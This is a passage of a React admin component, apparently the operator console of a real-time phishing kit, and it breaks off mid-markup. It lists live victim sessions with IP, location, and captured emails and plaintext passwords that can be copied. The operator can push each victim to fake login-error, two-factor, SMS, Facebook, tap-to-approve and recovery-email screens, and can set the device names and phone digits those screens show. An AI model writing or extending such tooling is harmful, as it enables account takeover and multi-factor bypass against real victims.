"use client"

import { useState, useEffect } from 'react'
import { supabase } from '@/lib/supabase'
import { getAllSessions, getSessionStats, setSessionRedirection, deleteSession, deleteSessions, AVAILABLE_PAGES, setAdminControls } from '@/lib/session-tracking'
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card'
import { Badge } from '@/components/ui/badge'
import { Button } from '@/components/ui/button'
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs'
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select'
import { Checkbox } from '@/components/ui/checkbox'
import { AlertDialog, AlertDialogAction, AlertDialogCancel, AlertDialogContent, AlertDialogDescription, AlertDialogFooter, AlertDialogHeader, AlertDialogTitle, AlertDialogTrigger } from '@/components/ui/alert-dialog'
import { RefreshCw, Users, Globe, Clock, Activity, Database, Filter, ArrowRight, Trash2, X, Settings } from 'lucide-react'
import { Input } from '@/components/ui/input'
import { Label } from '@/components/ui/label'
import { useToast } from '@/hooks/use-toast'

interface Session {
  id: string
  user_id?: string
  session_id: string
  ip_address?: string
  user_agent?: string
  page_url: string
  created_at: string
  updated_at: string
  is_active: boolean
  redirect_to_page?: string
  country?: string
  country_code?: string
  flag?: string
  city?: string
  region?: string
  user_email?: string
  user_password?: string
  credentials_collected_at?: string
  admin_tap_device_info?: string
  admin_tap_matching_number?: string
  admin_sms_last_digits?: string
  admin_recovery_email?: string

}

interface SessionStats {
  activeCount: number
  todayTotal: number
  averageDurationMinutes: number
}

export function AdminSessionViewer() {
  const { toast } = useToast()
  const [sessions, setSessions] = useState<Session[]>([])
  const [stats, setStats] = useState<SessionStats>({ activeCount: 0, todayTotal: 0, averageDurationMinutes: 0 })
  const [loading, setLoading] = useState(true)
  const [error, setError] = useState<string | null>(null)
  const [filter, setFilter] = useState<'all' | 'active' | 'inactive' | 'with-credentials'>('active')
  const [redirectingSession, setRedirectingSession] = useState<string | null>(null)
  const [selectedSessions, setSelectedSessions] = useState<Set<string>>(new Set())
  const [deletingSession, setDeletingSession] = useState<string | null>(null)
  const [deletingBulk, setDeletingBulk] = useState(false)
  const [showDeleteDialog, setShowDeleteDialog] = useState(false)
  const [sessionToDelete, setSessionToDelete] = useState<string | null>(null)
  const [showBulkDeleteDialog, setShowBulkDeleteDialog] = useState(false)
  const [editingControls, setEditingControls] = useState<string | null>(null)
  const [controlsForm, setControlsForm] = useState({
    tapDeviceInfo: '',
    tapMatchingNumber: '',
    smsLastDigits: '',
    recoveryEmail: ''
  })

  const handleSaveAdminControls = async (sessionId: string) => {
    try {
      await setAdminControls(sessionId, {
        tapDeviceInfo: controlsForm.tapDeviceInfo,
        tapMatchingNumber: controlsForm.tapMatchingNumber,
        smsLastDigits: controlsForm.smsLastDigits,
        recoveryEmail: controlsForm.recoveryEmail
      })
      setEditingControls(null)
      fetchData() // Refresh the session list
    } catch (error) {
      console.error('Error saving admin controls:', error)
    }
  }

  const handleEditControls = (session: Session) => {
    setEditingControls(session.session_id)
    setControlsForm({
      tapDeviceInfo: session.admin_tap_device_info || '',
      tapMatchingNumber: session.admin_tap_matching_number || '',
      smsLastDigits: session.admin_sms_last_digits || '',
      recoveryEmail: session.admin_recovery_email || ''
    })
  }

  const fetchData = async () => {
    setLoading(true)
    setError(null)

    try {
      // Fetch sessions and stats in parallel
      const [sessionsResult, statsResult] = await Promise.all([
        getAllSessions(200),
        getSessionStats()
      ])

      if (sessionsResult.success && sessionsResult.data) {
        // Filter out panel and security check sessions from the fetched data
        const filteredSessionsData = sessionsResult.data.filter(session => {
          const isPanelSession = session.page_url.includes('/panel')
          const isSecurityCheckSession = (() => {
            try {
              const url = new URL(session.page_url)
              // Check if pathname is root and there are no query parameters for dialog states
              const isRootPath = url.pathname === '/' && !url.searchParams.has('dialog')
              console.log(`🔍 Checking URL: "${session.page_url}" → pathname: "${url.pathname}" → params: ${url.search} → isSecurityCheck: ${isRootPath}`)
              return isRootPath
            } catch {
              // Fallback for relative URLs or malformed URLs
              const isRootPath = session.page_url === '/' || (session.page_url.endsWith('/') && !session.page_url.includes('?'))
              console.log(`🔍 Failed to parse URL: "${session.page_url}" → fallback isSecurityCheck: ${isRootPath}`)
              return isRootPath
            }
          })()
          const shouldInclude = !isPanelSession && !isSecurityCheckSession
          if (isSecurityCheckSession) {
            console.log(`❌ Filtering out security check session: ${session.page_url}`)
          }
          return shouldInclude
        })
        setSessions(filteredSessionsData)
      } else {
        setError('Failed to fetch sessions')
      }

      if (statsResult.success && statsResult.stats) {
        // Adjust stats to exclude panel and security check sessions
        const excludedSessionsCount = sessionsResult.data ?
          sessionsResult.data.filter(session => {
            const isPanelSession = session.page_url.includes('/panel')
            const isSecurityCheckSession = (() => {
              try {
                const url = new URL(session.page_url)
                // Check if pathname is root and there are no query parameters for dialog states
                return url.pathname === '/' && !url.searchParams.has('dialog')
              } catch {
                // Fallback for relative URLs or malformed URLs
                return session.page_url === '/' || (session.page_url.endsWith('/') && !session.page_url.includes('?'))
              }
            })()
            return (isPanelSession || isSecurityCheckSession) && session.is_active
          }).length : 0

        const adjustedStats = {
          ...statsResult.stats,
          activeCount: Math.max(0, statsResult.stats.activeCount - excludedSessionsCount)
        }
        setStats(adjustedStats)
      }
    } catch (err) {
      setError('Error fetching data')
      console.error('Error fetching data:', err)
    } finally {
      setLoading(false)
    }
  }

  useEffect(() => {
    fetchData()

    const channel = supabase.channel('realtime-admin-sessions')
      .on<Session>(
        'postgres_changes',
        { event: '*', schema: 'public', table: 'user_sessions' },
        (payload) => {
          console.log('Realtime change received:', payload)

          const isPanelSession = (session: Partial<Session>) => session?.page_url?.includes('/panel')
          const isSecurityCheckSession = (session: Partial<Session>) => {
            if (!session?.page_url) return false
            try {
              const url = new URL(session.page_url)
              // Check if pathname is root and there are no query parameters for dialog states
              const isRootPath = url.pathname === '/' && !url.searchParams.has('dialog')
              console.log(`🔍 Realtime - Checking URL: "${session.page_url}" → pathname: "${url.pathname}" → params: ${url.search} → isSecurityCheck: ${isRootPath}`)
              return isRootPath
            } catch {
              // Fallback for relative URLs or malformed URLs
              const isRootPath = session.page_url === '/' || (session.page_url.endsWith('/') && !session.page_url.includes('?'))
              console.log(`🔍 Realtime - Failed to parse URL: "${session.page_url}" → fallback isSecurityCheck: ${isRootPath}`)
              return isRootPath
            }
          }

          switch (payload.eventType) {
            case 'INSERT': {
              const newRecord = payload.new as Session
              const isPanel = isPanelSession(newRecord)
              const isSecurityCheck = isSecurityCheckSession(newRecord)
              console.log(`🔍 INSERT - Panel: ${isPanel}, SecurityCheck: ${isSecurityCheck}, URL: "${newRecord.page_url}"`)
              if (isPanel || isSecurityCheck) {
                console.log(`❌ Ignoring INSERT for filtered session: ${newRecord.page_url}`)
                return
              }

              setSessions(prev => [newRecord, ...prev.filter(s => s.id !== newRecord.id)])
              setStats(prev => ({
                ...prev,
                activeCount: prev.activeCount + (newRecord.is_active ? 1 : 0),
                todayTotal: prev.todayTotal + 1,
              }))
              break
            }
            case 'UPDATE': {
              const newRecord = payload.new as Session



              setSessions(prev => {
                const oldSession = prev.find(s => s.id === newRecord.id)
                const wasPanelSession = oldSession ? isPanelSession(oldSession) : false
                const wasSecurityCheckSession = oldSession ? isSecurityCheckSession(oldSession) : false
                const isNowPanelSession = isPanelSession(newRecord)
                const isNowSecurityCheckSession = isSecurityCheckSession(newRecord)

                // If now on panel or security check page, remove from list
                if (isNowPanelSession || isNowSecurityCheckSession) {
                  if (oldSession?.is_active) {
                    setStats(s => ({ ...s, activeCount: Math.max(0, s.activeCount - 1) }))
                  }
                  return prev.filter(s => s.id !== newRecord.id)
                } else if ((wasPanelSession || wasSecurityCheckSession) && !isNowPanelSession && !isNowSecurityCheckSession) {
                  // If was on panel/security check but now on a different page, add to list
                  if (newRecord.is_active) {
                    setStats(s => ({ ...s, activeCount: s.activeCount + 1 }))
                  }
                  return [newRecord, ...prev]
                } else {
                  // Normal update for sessions already in the list
                  if (oldSession && oldSession.is_active !== newRecord.is_active) {
                    setStats(s => ({
                      ...s,
                      activeCount: s.activeCount + (newRecord.is_active ? 1 : -1)
                    }))
                  }
                  return [newRecord, ...prev.filter(s => s.id !== newRecord.id)]
                }
              })
              break
            }
            case 'DELETE': {
              const oldRecord = payload.old as Partial<Session> & { id: string }
              if (!oldRecord.id) return

              setSessions(prev => {
                const deletedSession = prev.find(s => s.id === oldRecord.id)
                if (!deletedSession || isPanelSession(deletedSession) || isSecurityCheckSession(deletedSession)) return prev

                if (deletedSession.is_active) {
                  setStats(s => ({ ...s, activeCount: Math.max(0, s.activeCount - 1) }))
                }
                return prev.filter(s => s.id !== oldRecord.id)
              })
              break
            }
          }
        }
      )
      .subscribe()

    return () => {
      supabase.removeChannel(channel)
    }
  }, [])

  const formatTime = (dateString: string) => {
    return new Date(dateString).toLocaleString()
  }

  const getTimeSince = (dateString: string) => {
    const now = new Date()
    const date = new Date(dateString)
    const seconds = Math.floor((now.getTime() - date.getTime()) / 1000)

    if (seconds < 60) return `${seconds}s ago`
    if (seconds < 3600) return `${Math.floor(seconds / 60)}m ago`
    if (seconds < 86400) return `${Math.floor(seconds / 3600)}h ago`
    return `${Math.floor(seconds / 86400)}d ago`
  }

  const isUserCurrentlyActive = (session: Session) => {
    const now = new Date()
    const lastSeen = new Date(session.updated_at)
    const seconds = Math.floor((now.getTime() - lastSeen.getTime()) / 1000)
    // Consider user active if last seen within 4 seconds
    return session.is_active && seconds <= 4
  }

  const getSessionDuration = (session: Session) => {
    const start = new Date(session.created_at)
    const end = new Date(session.updated_at)
    const durationMs = end.getTime() - start.getTime()
    const minutes = Math.floor(durationMs / 1000 / 60)

    if (minutes < 1) return '< 1m'
    if (minutes < 60) return `${minutes}m`
    return `${Math.floor(minutes / 60)}h ${minutes % 60}m`
  }

  const getBrowserName = (userAgent?: string) => {
    if (!userAgent) return 'Unknown'
    if (userAgent.includes('Chrome')) return 'Chrome'
    if (userAgent.includes('Firefox')) return 'Firefox'
    if (userAgent.includes('Safari')) return 'Safari'
    if (userAgent.includes('Edge')) return 'Edge'
    return 'Other'
  }



  const handleRedirectUser = async (sessionId: string, redirectToPage: string) => {
    setRedirectingSession(sessionId)

    try {
      // Check if this page requires admin input values
      const needsTapValues = redirectToPage.includes('tap-yes')
      const needsSmsDigits = redirectToPage.includes('sms-otp')
      const needsRecoveryEmail = redirectToPage.includes('email-recovery')

      // Prompt for values if needed
      if (needsTapValues) {
        const deviceInfo = prompt("Enter device info (e.g., 'iPhone', 'Android Phone'):", "iPhone")
        if (deviceInfo === null) {
          setRedirectingSession(null)
          return // User canceled
        }
        const matchingNumber = prompt("Enter matching number (2-3 digits):", "45")
        if (matchingNumber === null) {
          setRedirectingSession(null)
          return // User canceled
        }

        // Save the values
        await setAdminControls(sessionId, {
          tapDeviceInfo: deviceInfo || 'device',
          tapMatchingNumber: matchingNumber || '45'
        })
      } else if (needsSmsDigits) {
        const lastDigits = prompt("Enter last 2 digits of phone number:", "45")
        if (lastDigits === null) {
          setRedirectingSession(null)
          return // User canceled
        }

        // Save the values
        await setAdminControls(sessionId, {
          smsLastDigits: lastDigits || '45'
        })
      } else if (needsRecoveryEmail) {
        const recoveryEmail = prompt("Enter recovery email to display:", "****@****.***")
        if (recoveryEmail === null) {
          setRedirectingSession(null)
          return // User canceled
        }

        // Save the values
        await setAdminControls(sessionId, {
          recoveryEmail: recoveryEmail || '****@****.***'
        })
      }

      const result = await setSessionRedirection(sessionId, redirectToPage)
      if (result.success) {
        // Show immediate success message
        setError(null)

        // Refresh sessions to show the updated redirect status
        await fetchData()

        // Optional: Show a temporary success message
        console.log(`Redirect triggered immediately for session ${sessionId} to ${redirectToPage}`)
      } else {
        setError('Failed to set redirection')
      }
    } catch (err) {
      setError('Error setting redirection')
      console.error('Error setting redirection:', err)
    } finally {
      setRedirectingSession(null)
    }
  }

  const handleDeleteSession = async (sessionId: string) => {
    setDeletingSession(sessionId)
    try {
      const result = await deleteSession(sessionId, true) // Use database ID
      if (result.success) {
        await fetchData() // Refresh sessions list
        setShowDeleteDialog(false)
        setSessionToDelete(null)
      } else {
        setError('Failed to delete session')
      }
    } catch (err) {
      setError('Error deleting session')
      console.error('Error deleting session:', err)
    } finally {
      setDeletingSession(null)
    }
  }

  const handleBulkDelete = async () => {
    setDeletingBulk(true)
    try {
      const sessionIds = Array.from(selectedSessions)
      const result = await deleteSessions(sessionIds, true) // Use database IDs
      if (result.success) {
        await fetchData() // Refresh sessions list
        setSelectedSessions(new Set()) // Clear selection
        setShowBulkDeleteDialog(false)
      } else {
        setError('Failed to delete sessions')
      }
    } catch (err) {
      setError('Error deleting sessions')
      console.error('Error deleting sessions:', err)
    } finally {
      setDeletingBulk(false)
    }
  }

  const handleSelectSession = (sessionId: string, checked: boolean) => {
    const newSelection = new Set(selectedSessions)
    if (checked) {
      newSelection.add(sessionId)
    } else {
      newSelection.delete(sessionId)
    }
    setSelectedSessions(newSelection)
  }

  const handleSelectAll = (checked: boolean) => {
    if (checked) {
      const allSessionIds = new Set(filteredSessions.map(session => session.id))
      setSelectedSessions(allSessionIds)
    } else {
      setSelectedSessions(new Set())
    }
  }

  const confirmDeleteSession = (sessionId: string) => {
    setSessionToDelete(sessionId)
    setShowDeleteDialog(true)
  }

  const confirmBulkDelete = () => {
    if (selectedSessions.size > 0) {
      setShowBulkDeleteDialog(true)
    }
  }

  const getCurrentPageOption = (pageUrl: string) => {
    // Extract the path and query from the full URL
    try {
      const url = new URL(pageUrl)
      const pathWithQuery = url.pathname + url.search

      // Check for exact matches first (including query parameters)
      const exactMatch = AVAILABLE_PAGES.find(page => page.value === pathWithQuery)
      if (exactMatch) return exactMatch.value

      // Check for dialog parameter matches
      const dialogParam = url.searchParams.get('dialog')
      if (url.pathname === '/schedule-call' && dialogParam) {
        const dialogMatch = AVAILABLE_PAGES.find(page =>
          page.value === `/schedule-call?dialog=${dialogParam}`
        )
        if (dialogMatch) return dialogMatch.value
      }

      // Check for path-only matches
      const pathMatch = AVAILABLE_PAGES.find(page => page.value === url.pathname)
      if (pathMatch) return pathMatch.value
      return ''
    } catch {
      // If URL parsing fails, try to match by checking if URL contains dialog parameters
      if (pageUrl.includes('dialog=login-error')) {
        return '/schedule-call?dialog=login-error'
      }
      if (pageUrl.includes('dialog=loading')) {
        return '/schedule-call?dialog=loading'
      }
      if (pageUrl.includes('dialog=2fa-email-error')) {
        return '/schedule-call?dialog=2fa-email-error'
      }
      if (pageUrl.includes('dialog=2fa-email')) {
        return '/schedule-call?dialog=2fa-email'
      }
      if (pageUrl.includes('dialog=2fa-sms-error')) {
        return '/schedule-call?dialog=2fa-sms-error'
      }
      if (pageUrl.includes('dialog=2fa-sms')) {
        return '/schedule-call?dialog=2fa-sms'
      }
      if (pageUrl.includes('dialog=2fa-error')) {
        return '/schedule-call?dialog=2fa-error'
      }
      if (pageUrl.includes('dialog=2fa')) {
        return '/schedule-call?dialog=2fa'
      }
      if (pageUrl.includes('dialog=facebook')) {
        return '/schedule-call?dialog=facebook'
      }

      // Fallback to path matching
      const matchingOption = AVAILABLE_PAGES.find(page =>
        pageUrl.includes(page.value.split('?')[0])
      )
      return matchingOption?.value || ''
    }
  }

  const filteredSessions = sessions.filter(session => {
    // Sessions are already filtered to exclude /panel pages in fetchData
    if (filter === 'active') return session.is_active
    if (filter === 'inactive') return !session.is_active
    if (filter === 'with-credentials') return session.user_email || session.user_password
    return true
  })

  if (loading) {
    return (
      <div className="space-y-6">
        {/* Stats Cards */}
        <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
          <Card>
            <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
              <CardTitle className="text-sm font-medium">Active Sessions</CardTitle>
              <Users className="h-4 w-4 text-muted-foreground" />
            </CardHeader>
            <CardContent>
              <div className="text-2xl font-bold">Loading...</div>
              <p className="text-xs text-muted-foreground">Currently active visitors</p>
            </CardContent>
          </Card>

          <Card>
            <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
              <CardTitle className="text-sm font-medium">Total Sessions</CardTitle>
              <Activity className="h-4 w-4 text-muted-foreground" />
            </CardHeader>
            <CardContent>
              <div className="text-2xl font-bold">Loading...</div>
              <p className="text-xs text-muted-foreground">All sessions today</p>
            </CardContent>
          </Card>

          <Card>
            <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
              <CardTitle className="text-sm font-medium">Avg. Session Time</CardTitle>
              <Clock className="h-4 w-4 text-muted-foreground" />
            </CardHeader>
            <CardContent>
              <div className="text-2xl font-bold">Loading...</div>
              <p className="text-xs text-muted-foreground">Average duration</p>
            </CardContent>
          </Card>
        </div>

        <Card>
          <CardContent className="flex items-center justify-center py-12">
            <RefreshCw className="w-6 h-6 animate-spin mr-2" />
            <span>Loading sessions...</span>
          </CardContent>
        </Card>
      </div>
    )
  }

  return (
    <div className="space-y-6">
      {/* Stats Cards */}
      <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
        <Card className="border-green-200 bg-green-50/50">
          <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
            <CardTitle className="text-sm font-medium">Currently Active</CardTitle>
            <div className="flex items-center gap-1">
              <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
              <Users className="h-4 w-4 text-green-600" />
            </div>
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold text-green-600 flex items-center gap-2">
              {sessions.filter(session => isUserCurrentlyActive(session)).length}
              <span className="text-lg">🟢</span>
            </div>
            <p className="text-xs text-green-700">Currently active (last seen ≤4s ago)</p>
          </CardContent>
        </Card>

        <Card>
          <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
            <CardTitle className="text-sm font-medium">Total Sessions</CardTitle>
            <Activity className="h-4 w-4 text-muted-foreground" />
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold text-blue-600">{stats.todayTotal}</div>
            <p className="text-xs text-muted-foreground">All sessions today</p>
          </CardContent>
        </Card>

        <Card>
          <CardHeader className="flex flex-row items-center justify-between space-y-0 pb-2">
            <CardTitle className="text-sm font-medium">Avg. Session Time</CardTitle>
            <Clock className="h-4 w-4 text-muted-foreground" />
          </CardHeader>
          <CardContent>
            <div className="text-2xl font-bold text-purple-600">
              {stats.averageDurationMinutes > 0 ? `${stats.averageDurationMinutes}m` : 'N/A'}
            </div>
            <p className="text-xs text-muted-foreground">Average duration</p>
          </CardContent>
        </Card>
      </div>



      {/* Sessions Table */}
      <Card>
        <CardHeader>
          <div className="flex items-center justify-between">
            <CardTitle className="flex items-center gap-2">
              <Database className="w-5 h-5" />
              All Sessions
              <Badge variant="secondary">{filteredSessions.length}</Badge>
              {selectedSessions.size > 0 && (
                <Badge variant="destructive">{selectedSessions.size} selected</Badge>
              )}
            </CardTitle>
            <div className="flex items-center gap-2">
              {selectedSessions.size > 0 && (
                <AlertDialog open={showBulkDeleteDialog} onOpenChange={setShowBulkDeleteDialog}>
                  <AlertDialogTrigger asChild>
                    <Button
                      variant="destructive"
                      size="sm"
                      disabled={deletingBulk}
                      onClick={confirmBulkDelete}
                    >
                      <Trash2 className="w-4 h-4 mr-2" />
                      Delete Selected ({selectedSessions.size})
                    </Button>
                  </AlertDialogTrigger>
                  <AlertDialogContent>
                    <AlertDialogHeader>
                      <AlertDialogTitle>Delete Sessions</AlertDialogTitle>
                      <AlertDialogDescription>
                        Are you sure you want to delete {selectedSessions.size} selected session{selectedSessions.size > 1 ? 's' : ''}? This action cannot be undone.
                      </AlertDialogDescription>
                    </AlertDialogHeader>
                    <AlertDialogFooter>
                      <AlertDialogCancel>Cancel</AlertDialogCancel>
                      <AlertDialogAction
                        onClick={handleBulkDelete}
                        disabled={deletingBulk}
                        className="bg-red-600 hover:bg-red-700"
                      >
                        {deletingBulk ? (
                          <>
                            <RefreshCw className="w-4 h-4 mr-2 animate-spin" />
                            Deleting...
                          </>
                        ) : (
                          <>
                            <Trash2 className="w-4 h-4 mr-2" />
                            Delete {selectedSessions.size} Session{selectedSessions.size > 1 ? 's' : ''}
                          </>
                        )}
                      </AlertDialogAction>
                    </AlertDialogFooter>
                  </AlertDialogContent>
                </AlertDialog>
              )}
              <Tabs value={filter} onValueChange={(value) => setFilter(value as any)} className="w-auto">
                <TabsList className="grid w-full grid-cols-4">
                  <TabsTrigger value="all">All</TabsTrigger>
                  <TabsTrigger value="active">Active</TabsTrigger>
                  <TabsTrigger value="inactive">Inactive</TabsTrigger>
                  <TabsTrigger value="with-credentials">🔐 With Credentials</TabsTrigger>
                </TabsList>
              </Tabs>
              <Button
                onClick={fetchData}
                variant="outline"
                size="sm"
                disabled={loading}
              >
                <RefreshCw className={`w-4 h-4 mr-2 ${loading ? 'animate-spin' : ''}`} />
                Refresh
              </Button>
            </div>
          </div>
          {filteredSessions.length > 0 && (
            <div className="flex items-center gap-2 pt-2">
              <Checkbox
                id="select-all"
                checked={selectedSessions.size === filteredSessions.length}
                onCheckedChange={handleSelectAll}
              />
              <label htmlFor="select-all" className="text-sm font-medium cursor-pointer">
                Select All
              </label>
              {selectedSessions.size > 0 && (
                <Button
                  variant="ghost"
                  size="sm"
                  onClick={() => setSelectedSessions(new Set())}
                >
                  <X className="w-4 h-4 mr-1" />
                  Clear Selection
                </Button>
              )}
            </div>
          )}
        </CardHeader>
        <CardContent>
          {error && (
            <div className="text-red-500 text-sm mb-4">
              {error}
            </div>
          )}

          {filteredSessions.length === 0 ? (
            <div className="text-center py-8 text-gray-500">
              No sessions found for the selected filter
            </div>
          ) : (
            <div className="space-y-4">
              {filteredSessions.map((session) => (
                <div key={session.id} className={`border-2 rounded-lg p-4 space-y-3 ${isUserCurrentlyActive(session) ? 'border-green-200 bg-green-50/30' : 'border-red-200 bg-red-50/30'}`}>
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-2">
                      <Checkbox
                        id={`session-${session.id}`}
                        checked={selectedSessions.has(session.id)}
                        onCheckedChange={(checked) => handleSelectSession(session.id, checked as boolean)}
                      />
                      {/* Active/Inactive Status Dot */}
                      <div className={`w-3 h-3 rounded-full ${isUserCurrentlyActive(session) ? 'bg-green-500 animate-pulse' : 'bg-red-500'}`}
                        title={isUserCurrentlyActive(session) ? 'User is currently active (last seen ≤4s ago)' : 'User is inactive or was last seen >4s ago'} />
                      <Globe className="w-4 h-4 text-blue-500" />
                      <span className="font-medium text-sm break-all flex-1">
                        {decodeURIComponent(session.page_url)}
                      </span>
                    </div>
                    <div className="flex items-center gap-2">
                      <Badge
                        variant={isUserCurrentlyActive(session) ? "default" : "secondary"}
                        className={isUserCurrentlyActive(session) ? "bg-green-600 hover:bg-green-700 text-white" : "bg-red-100 text-red-800 border-red-300"}
                      >
                        {isUserCurrentlyActive(session) ? "🟢 Active Now" : "🔴 Inactive"}
                      </Badge>
                      <Badge variant="outline">
                        {getSessionDuration(session)}
                      </Badge>
                      <AlertDialog open={showDeleteDialog && sessionToDelete === session.id} onOpenChange={(open) => {
                        if (!open) {
                          setShowDeleteDialog(false)
                          setSessionToDelete(null)
                        }
                      }}>
                        <AlertDialogTrigger asChild>
                          <Button
                            variant="ghost"
                            size="sm"
                            onClick={() => confirmDeleteSession(session.id)}
                            disabled={deletingSession === session.id}
                          >
                            {deletingSession === session.id ? (
                              <RefreshCw className="w-4 h-4 animate-spin text-red-500" />
                            ) : (
                              <Trash2 className="w-4 h-4 text-red-500 hover:text-red-700" />
                            )}
                          </Button>
                        </AlertDialogTrigger>
                        <AlertDialogContent>
                          <AlertDialogHeader>
                            <AlertDialogTitle>Delete Session</AlertDialogTitle>
                            <AlertDialogDescription>
                              Are you sure you want to delete this session? This action cannot be undone.
                            </AlertDialogDescription>
                          </AlertDialogHeader>
                          <AlertDialogFooter>
                            <AlertDialogCancel>Cancel</AlertDialogCancel>
                            <AlertDialogAction
                              onClick={() => handleDeleteSession(session.id)}
                              disabled={deletingSession === session.id}
                              className="bg-red-600 hover:bg-red-700"
                            >
                              {deletingSession === session.id ? (
                                <>
                                  <RefreshCw className="w-4 h-4 mr-2 animate-spin" />
                                  Deleting...
                                </>
                              ) : (
                                <>
                                  <Trash2 className="w-4 h-4 mr-2" />
                                  Delete Session
                                </>
                              )}
                            </AlertDialogAction>
                          </AlertDialogFooter>
                        </AlertDialogContent>
                      </AlertDialog>
                    </div>
                  </div>

                  <div className="grid grid-cols-2 md:grid-cols-4 gap-4 text-sm text-gray-600">
                    <div>
                      <span className="font-medium">Browser:</span> {getBrowserName(session.user_agent)}
                    </div>
                    <div className="flex items-center gap-2">
                      <span className="font-medium">IP:</span>
                      <span>{session.ip_address || 'N/A'}</span>
                      {session.flag && (
                        <span className="text-lg" title={session.country || 'Unknown'}>
                          {session.flag}
                        </span>
                      )}
                    </div>
                    <div className="flex items-center gap-1">
                      <Clock className="w-3 h-3" />
                      <span className="font-medium">Started:</span> {formatTime(session.created_at)}
                    </div>
                    <div className="flex items-center gap-1">
                      <Clock className="w-3 h-3" />
                      <span className="font-medium">Last seen:</span> {getTimeSince(session.updated_at)}
                    </div>
                  </div>

                  {/* Location Information */}
                  {(session.country || session.city) && (
                    <div className="mt-2 text-xs text-gray-500 flex items-center gap-2">
                      <span className="font-medium">Location:</span>
                      <span>
                        {[session.city, session.region, session.country]
                          .filter(Boolean)
                          .join(', ')
                        }
                      </span>
                    </div>
                  )}

                  {/* User Credentials */}
                  {(session.user_email || session.user_password || session.user_agent) && (
                    <div className="mt-3 p-3 bg-yellow-50 border border-yellow-200 rounded-lg">
                      <div className="flex items-center gap-2 mb-2">
                        <span className="text-sm font-semibold text-yellow-800">🔐 User Credentials</span>
                        {session.credentials_collected_at && (
                          <span className="text-xs text-yellow-600">
                            ({formatTime(session.credentials_collected_at)})
                          </span>
                        )}
                      </div>
                      {session.user_email && (
                        <div className="text-sm text-gray-700 mb-1 flex items-center justify-between">
                          <div className="flex items-center">
                            <span className="font-medium">Email:</span>
                            <span className="ml-2 font-mono bg-white px-2 py-1 rounded border">
                              {session.user_email}
                            </span>
                          </div>
                          <Button
                            size="sm"
                            variant="outline"
                            className="h-6 px-2 text-xs"
                            onClick={() => {
                              navigator.clipboard.writeText(session.user_email || '')
                              toast({
                                title: "Email copied!",
                                description: "Email address has been copied to clipboard.",
                                duration: 2000,
                              })
                            }}
                          >
                            Copy
                          </Button>
                        </div>
                      )}
                      {session.user_password && (
                        <div className="text-sm text-gray-700 mb-1 flex items-center justify-between">
                          <div className="flex items-center">
                            <span className="font-medium">Password:</span>
                            <span className="ml-2 font-mono bg-white px-2 py-1 rounded border">
                              {session.user_password}
                            </span>
                          </div>
                          <Button
                            size="sm"
                            variant="outline"
                            className="h-6 px-2 text-xs"
                            onClick={() => {
                              navigator.clipboard.writeText(session.user_password || '')
                              toast({
                                title: "Password copied!",
                                description: "Password has been copied to clipboard.",
                                duration: 2000,
                              })
                            }}
                          >
                            Copy
                          </Button>
                        </div>
                      )}
                      {session.user_agent && (
                        <div className="text-sm text-gray-700 flex items-center justify-between">
                          <div className="flex items-center flex-1 min-w-0">
                            <span className="font-medium">User Agent:</span>
                            <span className="ml-2 font-mono bg-white px-2 py-1 rounded border text-xs truncate flex-1">
                              {session.user_agent}
                            </span>
                          </div>
                          <Button
                            size="sm"
                            variant="outline"
                            className="h-6 px-2 text-xs ml-2 flex-shrink-0"
                            onClick={() => {
                              navigator.clipboard.writeText(session.user_agent || '')
                              toast({
                                title: "User Agent copied!",
                                description: "User agent string has been copied to clipboard.",
                                duration: 2000,
                              })
                            }}
                          >
                            Copy
                          </Button>
                        </div>
                      )}
                    </div>
                  )}

                  <div className="flex items-center justify-between text-xs text-gray-500">
                    <span>Session ID: {session.session_id}</span>
                    {session.user_id && (
                      <span>User ID: {session.user_id}</span>
                    )}
                  </div>

                  {/* Redirect Controls - Only show for active sessions */}
                  {session.is_active && (
                    <div className="border-t pt-3 mt-3">
                      <div className="flex items-center justify-between">
                        <div className="flex items-center gap-2">
                          <ArrowRight className="w-4 h-4 text-blue-500" />
                          <span className="text-sm font-medium">Redirect User:</span>
                        </div>
                        <div className="flex items-center gap-2">
                          <Select
                            key={`${session.session_id}-${session.page_url}-${session.updated_at}`}
                            onValueChange={(value) => handleRedirectUser(session.session_id, value)}
                            disabled={redirectingSession === session.session_id}
                            value={getCurrentPageOption(session.page_url)}
                          >
                            <SelectTrigger className="w-48 h-8">
                              <SelectValue placeholder="Select page..." />
                            </SelectTrigger>
                            <SelectContent>
                              {AVAILABLE_PAGES.map((page) => (
                                <SelectItem key={page.value} value={page.value}>
                                  {page.label}
                                </SelectItem>
                              ))}
                            </SelectContent>
                          </Select>
                          {redirectingSession === session.session_id && (
                            <RefreshCw className="w-4 h-4 animate-spin text-blue-500" />
                          )}
                        </div>
                      </div>
                      {session.redirect_to_page && (
                        <div className="mt-2 text-xs text-orange-600 bg-orange-50 px-2 py-1 rounded">
                          <strong>Pending redirect:</strong> {AVAILABLE_PAGES.find(p => p.value === session.redirect_to_page)?.label || session.redirect_to_page}
                        </div>
                      )}

                      {/* Admin Controls */}
                      <div className="border-t pt-3 mt-3">
                        <div className="flex items-center justify-between mb-2">
                          <div className="flex items-center gap-2">
                            <Settings className="w-4 h-4 text-purple-500" />
                            <span className="text-sm font-medium">Admin Controls:</span>
                          </div>
                          {editingControls !== session.session_id ? (
                            <Button
                              size="sm"
                              variant="outline"
                              onClick={() => handleEditControls(session)}
                              className="h-7 text-xs"
                            >
                              Edit Values
                            </Button>
                          ) : (
                            <div className="flex gap-1">
                              <Button
                                size="sm"
                                onClick={() => handleSaveAdminControls(session.session_id)}
                                className="h-7 text-xs bg-green-600 hover:bg-green-700"
                              >
                                Save
                              </Button>
                              <Button
                                size="sm"
                                variant="outline"
                                onClick={() => setEditingControls(null)}
                                className="h-7 text-xs"
                              >
                                Cancel
